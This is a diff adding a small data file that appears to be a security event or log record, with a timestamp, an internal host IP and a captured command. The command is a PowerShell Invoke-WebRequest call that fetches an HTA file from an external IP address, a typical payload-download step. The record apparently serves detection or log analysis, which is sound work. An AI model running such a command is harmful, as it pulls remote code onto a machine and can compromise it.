@@ -1,0 +1,7 @@
+[occurTime]
+2022-04-08 14:32:54.000
+2022-04-08 14:32:54.000
+[hostIp]
+192.168.0.74
+[pCommand]
+Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType "application/json"
